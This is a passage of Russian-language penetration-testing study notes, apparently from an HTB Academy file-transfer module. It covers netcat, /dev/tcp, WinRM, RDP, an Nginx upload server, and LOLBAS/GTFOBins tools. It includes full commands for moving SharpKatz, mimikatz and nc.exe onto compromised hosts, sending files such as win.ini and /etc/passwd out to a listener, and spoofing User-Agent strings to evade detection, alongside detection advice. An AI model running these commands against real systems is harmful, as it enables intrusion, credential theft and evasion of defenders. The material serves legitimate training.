**Как это сделать (пример загрузки файла на скомпрометированную машину):**

**Метод 1: Компрометированная машина слушает, атакующая машина отправляет.**

1. **На скомпрометированной машине (Windows/Linux):** Запустите `Netcat` (`nc`) или `Ncat` (`ncat`) для прослушивания (например, на порту 8000) и перенаправления вывода в файл.
    - **Оригинальный Netcat:**
        
        ```
        nc -l -p 8000 > SharpKatz.exe
        ```
        
    - **Ncat:** Используйте `--recv-only`, чтобы закрыть соединение после завершения передачи файла.
        
        ```
        ncat -l -p 8000 --recv-only > SharpKatz.exe
        ```
        
2. **На атакующей машине (Pwnbox):** Подключитесь к скомпрометированной машине на порт 8000 и отправьте файл `SharpKatz.exe` как входные данные для `Netcat`.
    - **Оригинальный Netcat:** Используйте `-q 0`, чтобы `Netcat` закрыл соединение сразу после завершения.
        
        ```
        nc -q 0 192.168.49.128 8000 < SharpKatz.exe
        ```
        
    - **Ncat:** Используйте `--send-only`, чтобы `Ncat` завершил работу, как только его ввод исчерпан.
        
        ```
        ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
        ```
        

**Метод 2: Атакующая машина слушает, компрометированная машина подключается.**

- Этот метод полезен, если брандмауэр блокирует входящие соединения на скомпрометированной машине.

1. **На атакующей машине (Pwnbox):** Запустите `Netcat` или `Ncat` для прослушивания (например, на порту 443) и отправьте файл `SharpKatz.exe` как входные данные.
    - **Оригинальный Netcat:**
        
        ```
        sudo nc -l -p 443 -q 0 < SharpKatz.exe
        ```
        
    - **Ncat:**
        
        ```
        sudo ncat -l -p 443 --send-only < SharpKatz.exe
        ```
        
2. **На скомпрометированной машине (Windows/Linux):** Подключитесь к Netcat-серверу на Pwnbox, чтобы получить файл.
    - **Оригинальный Netcat:**
        
        ```
        nc 192.168.49.128 443 > SharpKatz.exe
        ```
        
    - **Ncat:**
        
        ```
        ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
        ```
        
    - **Если нет `Netcat` или `Ncat` (только Bash):** Bash поддерживает операции чтения/записи через псевдофайл `/dev/TCP/`.
        
        ```
        cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
        ```
        

- **Примечание:** Те же операции могут использоваться для передачи файлов со скомпрометированного хоста на Pwnbox.

#### 5.2. Передача файлов через сессию PowerShell (WinRM)

- **Когда полезно:** Если HTTP, HTTPS или SMB недоступны.
- **Что это:** PowerShell Remoting (WinRM) позволяет выполнять скрипты или команды на удаленном компьютере через сессии PowerShell.
- **Порты:** По умолчанию PowerShell Remoting создает слушатели HTTP (TCP/5985) и HTTPS (TCP/5986).
- **Требования:** Для создания сессии PowerShell Remoting вам потребуется административный доступ, членство в группе `Remote Management Users` или явные разрешения для PowerShell Remoting в конфигурации сессии.

**Как это сделать (пример копирования файлов между `DC01` и `DATABASE01`):**

1. **Убедитесь, что порт WinRM TCP 5985 открыт на целевой машине (`DATABASE01`):**
    
    ```
    Test-NetConnection -ComputerName DATABASE01 -Port 5985
    # Вывод: TcpTestSucceeded : True
    ```
    
2. **Создайте сессию PowerShell Remoting на `DATABASE01` (с `DC01`, имея админ. права):**
    
    ```
    $Session = New-PSSession -ComputerName DATABASE01
    ```
    
3. **Скопируйте файл с вашей локальной машины (`DC01`) в сессию `DATABASE01`:**
    
    ```
    Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
    ```
    
4. **Скопируйте файл из сессии `DATABASE01` на вашу локальную машину (`DC01`):**
    
    ```
    Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
    ```
    

#### 5.3. RDP (Remote Desktop Protocol)

- **Что это:** RDP широко используется в сетях Windows для удаленного доступа.
- **Как это работает:**
    - **Копирование и вставка:** Вы можете копировать и вставлять файлы, как обычно (правой кнопкой мыши -> Копировать -> Вставить).
    - **Монтирование локального ресурса:** Если вы подключены из Linux, вы можете использовать `xfreerdp` или `rdesktop` для подключения и **открытия локальной папки на удаленном RDP-сервере**.
        - **Использование `rdesktop`:**
            
            ```
            rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
            ```
            
        - **Использование `xfreerdp`:**
            
            ```
            xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
            ```
            
    - **Доступ к каталогу:** Вы можете получить доступ к смонтированному каталогу через `\\tsclient\`.
    - **Windows:** В Windows для этого используется встроенный клиент `mstsc.exe`.
- **Примечание:** Смонтированный диск не доступен другим пользователям, вошедшим в систему на целевом компьютере, даже если им удастся перехватить RDP-сессию.

### 6. Защищенные передачи файлов (Protected File Transfers)

Как пентестеры, мы часто получаем доступ к очень конфиденциальным данным (списки пользователей, учетные данные, данные о сетевой инфраструктуре). Поэтому **крайне важно шифровать эти данные или использовать зашифрованные соединения**, такие как SSH, SFTP и HTTPS.

- **Этические соображения:** Если клиент явно не просил об этом, **не рекомендуется эксфильтровать конфиденциальные данные** (PII, финансовые данные, коммерческие тайны). Вместо этого создавайте файлы с фиктивными данными, имитирующими защищаемые данные, для тестирования механизмов предотвращения утечек данных (DLP).
- **Профессиональная ответственность:** Как специалисты по информационной безопасности, мы должны действовать профессионально и ответственно, принимая все меры для защиты данных, с которыми сталкиваемся во время оценки. Шифрование данных защищает их от прочтения в случае перехвата при передаче.

#### 6.1. Шифрование файлов в Windows

- **Что это:** Один из самых простых методов — использование PowerShell-скрипта `Invoke-AESEncryption.ps1`. Этот скрипт невелик и обеспечивает шифрование файлов и строк.

**Как это сделать (использование `Invoke-AESEncryption.ps1`):**

1. **Передайте скрипт на целевой хост** любым из ранее показанных методов.
2. **Импортируйте скрипт как модуль:**
    
    ```
    Import-Module .\Invoke-AESEncryption.ps1
    ```
    
3. **Зашифруйте файл:**
    
    - Команда создает зашифрованный файл с тем же именем, но с расширением `.aes`.
    
    ```
    Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
    # Вывод: File encrypted to C:\htb\scan-results.txt.aes
    ```
    
    - **Параметры:**
        - `-Mode`: `Encrypt` или `Decrypt`.
        - `-Key`: Пароль для шифрования/дешифрования.
        - `-Text`: Строка для шифрования/дешифрования.
        - `-Path`: Путь к файлу для шифрования/дешифрования.

- **Важность пароля:** **Использование очень надежных и уникальных паролей** для шифрования для каждой компании, где проводится пентест, крайне важно для предотвращения компрометации конфиденциальных файлов.

#### 6.2. Шифрование файлов в Linux

- **Что это:** `OpenSSL` часто входит в состав дистрибутивов Linux и используется для генерации сертификатов безопасности. `OpenSSL` также может использоваться для шифрования файлов.
- **Как это работает:** Вы можете выбрать различные шифры (например, `-aes256`), переопределить количество итераций (например, `-iter 100000`) и добавить опцию `-pbkdf2` для использования алгоритма Password-Based Key Derivation Function 2.

**Как это сделать:**

1. **Зашифруйте файл (например, `/etc/passwd`):**
    
    ```
    openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
    # Вам будет предложено ввести пароль
    ```
    
    - **Важность пароля:** Помните, что нужно использовать надежный и уникальный пароль, чтобы избежать атак подбора, если файл попадет к злоумышленнику.
2. **Расшифруйте файл:**
    
    ```
    openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
    # Вам будет предложено ввести пароль
    ```
    

- **Рекомендация:** После шифрования файла **рекомендуется использовать безопасные методы передачи**, такие как HTTPS, SFTP или SSH.

### 7. Перехват файлов по HTTP/S (Catching Files over HTTP/S)

Веб-передача является наиболее распространенным способом передачи файлов для большинства людей, поскольку HTTP/HTTPS - это наиболее распространенные протоколы, разрешенные через брандмауэры. Еще одно огромное преимущество заключается в том, что во многих случаях **файл будет зашифрован при передаче**.

- **Nginx - Включение PUT:** Хорошая альтернатива Apache для передачи файлов, поскольку конфигурация менее сложна, а модульная система не приводит к проблемам безопасности так легко, как Apache.
- **Важное замечание:** При разрешении HTTP-загрузок **критически важно быть на 100% уверенным, что пользователи не могут загружать веб-оболочки и выполнять их**. Apache позволяет легко совершить такую ошибку, поскольку модуль PHP любит выполнять все, что заканчивается на `.php`. Настройка Nginx для использования PHP далеко не так проста.

**Как настроить Nginx для приема загрузок:**

1. **Создайте каталог для загруженных файлов:**
    
    ```
    sudo mkdir -p /var/www/uploads/SecretUploadDirectory
    ```
    
2. **Измените владельца на `www-data`:**
    
    ```
    sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
    ```
    
3. **Создайте конфигурационный файл Nginx:**
    - Создайте файл `/etc/nginx/sites-available/upload.conf` со следующим содержимым:
        
        ```
        server {
            listen 9001;
            location /SecretUploadDirectory/ {
                # Здесь будет отсутствовать директива для PUT-запросов в примере, но подразумевается, что она должна быть добавлена.
                # Например: client_body_temp_path /var/www/uploads/SecretUploadDirectory/temp;
                #           client_body_in_file_only on;
                #           client_body_buffer_size 128k;
                #           client_max_body_size 100m;
                #           proxy_pass_request_headers on;
                #           proxy_set_header X-Real-IP $remote_addr;
                #           proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                #           proxy_set_header Host $host;
                #           proxy_pass_request_body on;
                #           proxy_set_header Content-Length $content_length;
                #           proxy_set_header Content-Type $content_type;
                #           proxy_set_header X-File-Name $request_uri;
                #           proxy_set_header X-Original-URI $request_uri;
                #           proxy_set_header X-Target-Path $uri;
                #           proxy_set_header X-Path $uri;
                #           dav_methods PUT DELETE MKCOL COPY MOVE; # Разрешить DAV методы
                #           create_full_put_path on; # Разрешить создание пути для PUT
                #           dav_access user:rw group:rw all:r; # Права доступа
            }
        }
        ```
        
4. **Создайте символическую ссылку на каталог `sites-enabled`:**
    
    ```
    sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
    ```
    
5. **Перезапустите Nginx:**
    
    ```
    sudo systemctl restart nginx.service
    ```
    

- **Проверка ошибок:** Если возникнут ошибки, проверьте `/var/log/nginx/error.log`. Если используется Pwnbox, вы можете увидеть, что порт 80 уже используется (поскольку там может быть запущен другой веб-сервер, например, Python).
    - **Пример ошибки:**
        
        ```
        2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: Address already in use)
        ```
        
    - **Обход:** Удалите конфигурацию Nginx по умолчанию, которая привязывается к порту 80:
        
        ```
        sudo rm /etc/nginx/sites-enabled/default
        ```
        

6. **Загрузка файла с использованием `cURL` (пример):**
    - Загрузите файл `/etc/passwd` на сервер и назовите его `users.txt`:
        
        ```
        curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
        ```
        
    - Проверьте последнюю строку загруженного файла:
        
        ```
        sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
        ```
        

- **Проверка списка каталогов:** Хорошей проверкой является убедиться, что список каталогов не включен, перейдя по адресу `http://localhost/SecretUploadDirectory`. Nginx по умолчанию не включает эту функцию, что хорошо для скрытия конфиденциальных файлов.

### 8. "Жить за счет земли" (Living off The Land)

- **Что это:** Фраза "Living off the Land" (LOL) означает использование **встроенных утилит Windows и Linux** для выполнения действий, выходящих за рамки их первоначального назначения. Этот подход позволяет злоумышленнику действовать без загрузки сторонних инструментов, что затрудняет обнаружение.
- **Ресурсы:** Существуют два основных проекта, агрегирующие информацию о таких бинарниках:
    - **LOLBAS Project** для бинарников Windows.
    - **GTFOBins** для бинарников Linux.
- **Функции:** Бинарники LOLBAS и GTFOBins могут использоваться для загрузки/выгрузки файлов, выполнения команд, чтения/записи файлов и обхода защит.

#### 8.1. LOLBAS (Windows)

- **Поиск:** На веб-сайте LOLBAS вы можете искать функции загрузки и выгрузки, используя `/download` или `/upload`.
- **Пример: `CertReq.exe` для загрузки:**
    - `CertReq.exe` может использоваться для отправки POST-запросов, а следовательно, для загрузки файлов.
    - **Как это сделать (загрузка `win.ini` на Pwnbox):**
        1. **На Pwnbox:** Запустите Netcat для прослушивания (например, на порту 8000):
            
            ```
            sudo nc -lvnp 8000
            # Вывод: listening on [any] 8000 ...
            ```
            
        2. **На целевой машине Windows:** Выполните `certreq.exe` для загрузки файла:
            
            ```
            certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
            ```
            
        3. **На Pwnbox:** Netcat получит содержимое файла, которое вы сможете скопировать.
    - **Примечание:** Если вы получаете ошибку при запуске `certreq.exe`, ваша версия может не содержать параметр `-Post`.

#### 8.2. GTFOBins (Linux)

- **Поиск:** На веб-сайте GTFOBins вы можете искать функции загрузки и выгрузки, используя `+file download` или `+file upload`.
- **Пример: `openssl` для загрузки:**
    - `openssl` может использоваться для "nc-стиля" отправки файлов.
    - **Как это сделать:**
        1. **На Pwnbox (атакующая машина):**
            - **Создайте сертификат:**
                
                ```
                openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
                # Пройдите шаги создания сертификата
                ```
                
            - **Запустите сервер `openssl`:** Передайте ему файл для "отправки" через соединение.
                
                ```
                openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
                ```
                
        2. **На скомпрометированной машине Linux:** Загрузите файл с помощью `openssl s_client`.
            
            ```
            openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
            ```
            

#### 8.3. Другие распространенные LOL-инструменты

- **Bitsadmin (функция загрузки):**
    - **Что это:** Background Intelligent Transfer Service (BITS) может использоваться для загрузки файлов с HTTP-сайтов и SMB-ресурсов. Он "интеллектуально" учитывает загрузку хоста и сети для минимизации влияния на работу пользователя.
    - **Как это сделать:**
        - **Командная строка Windows:**
            
            ```
            bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
            ```
            
        - **PowerShell:**
            
            ```
            Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
            ```
            
- **Certutil:**
    - **Что это:** Кэйси Смит обнаружил, что `Certutil` можно использовать для загрузки произвольных файлов. Он доступен во всех версиях Windows и долгое время был популярной техникой передачи файлов, служа де-факто "wget для Windows".
    - **Обнаружение:** Однако, в настоящее время Anti-Malware Scan Interface (AMSI) обнаруживает это как вредоносное использование `Certutil`.
    - **Как это сделать:**
        
        ```
        certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
        ```

### 9. Обнаружение (Detection)

- **Обнаружение по командной строке:**
    
    - Обнаружение на основе **черных списков** (blacklisting) легко обходится, даже с помощью простой обфускации регистра символов.
    - **Белые списки** (whitelisting) всех командных строк в определенной среде, хотя изначально времязатратны, очень надежны и позволяют быстро обнаруживать и оповещать о любых необычных командных строках.
- **Строки User Agent:**
    
    - Большинство клиент-серверных протоколов требуют согласования доставки контента. HTTP-клиенты чаще всего распознаются по их **строке User Agent**, которую сервер использует для идентификации подключающегося HTTP-клиента (например, Firefox, Chrome).
    - Строки User Agent используются не только для веб-браузеров, но и для любого HTTP-клиента, подключающегося к веб-серверу (например, `cURL`, пользовательский скрипт Python, `sqlmap` или `Nmap`).
    - **Как организации могут выявлять потенциально подозрительные User Agent:**
        1. Создать список известных легитимных строк User Agent.
        2. Включить User Agent, используемые процессами ОС по умолчанию, службами обновлений (Windows Update, антивирус).
        3. Загрузить эти данные в SIEM-систему для фильтрации легитимного трафика и выявления аномалий.
        4. Любые подозрительные строки User Agent должны быть дополнительно расследованы.
- **Примеры User Agent/заголовков из распространенных техник HTTP-передачи (Windows 10, PowerShell 5):**
    
    - **`Invoke-WebRequest`:**
        - Клиент: `User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0`.
    - **`WinHttpRequest`:**
        - Клиент: `User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)`.
    - **`Msxml2`:**
        - Клиент: `User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E) x64;` (похожий на IE, но с `Msxml2`).
    - **`Certutil`:**
        - Клиент: `User-Agent: Microsoft-CryptoAPI/10.0`.
    - **BITS:**
        - Клиент: `User-Agent: Microsoft BITS/7.8`.
- **Заключительные мысли об обнаружении:** Создание белого списка разрешенных бинарников или черного списка вредоносных бинарников, а также поиск аномальных строк User Agent — отличные отправные точки для любой организации.
    

### 10. Обход обнаружения (Evading Detection)

#### 10.1. Изменение User Agent

- **Что это:** Если администраторы или защитники занесли в черный список какие-либо из этих User Agents, `Invoke-WebRequest` имеет параметр `UserAgent`, который позволяет изменить User Agent по умолчанию на тот, который имитирует Internet Explorer, Firefox, Chrome, Opera или Safari.
- **Преимущество:** Если Chrome используется внутри сети, установка такого User Agent может сделать запрос более легитимным.

**Как это сделать:**

1. **Выведите список доступных User Agent:**
    
    ```
    [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={ [Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
    ```
    
2. **Вызовите `Invoke-WebRequest` для загрузки `nc.exe` с использованием User Agent Chrome:**
    
    ```
    $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
    Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent
    ```
    

#### 10.2. LOLBAS / GTFOBins

- **Что это:** Если политика белых списков приложений предотвращает использование PowerShell или Netcat, а логирование командной строки оповещает защитников, то использование "LOLBIN" (Living Off the Land Binary) может быть вариантом. Эти бинарники также известны как "бинарники с неправильным доверием".
- **Пример: `GfxDownloadWrapper.exe`:**
    - **Что это:** Intel Graphics Driver для Windows 10 (`GfxDownloadWrapper.exe`) устанавливается на некоторые системы и содержит функциональность для периодической загрузки файлов конфигурации.
    - **Как это сделать:**
        
        ```
        GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
        ```
        
    - **Преимущество:** Такой бинарник может быть разрешен политикой белых списков приложений и исключен из системы оповещения.
- **Ресурсы:** Стоит проверять проекты LOLBAS (Windows) и GTFOBins (Linux) для поиска подходящих бинарников для загрузки файлов, которые существуют в вашей среде. GTFOBins предоставляет информацию о почти 40 часто устанавливаемых бинарниках, которые могут использоваться для передачи файлов.
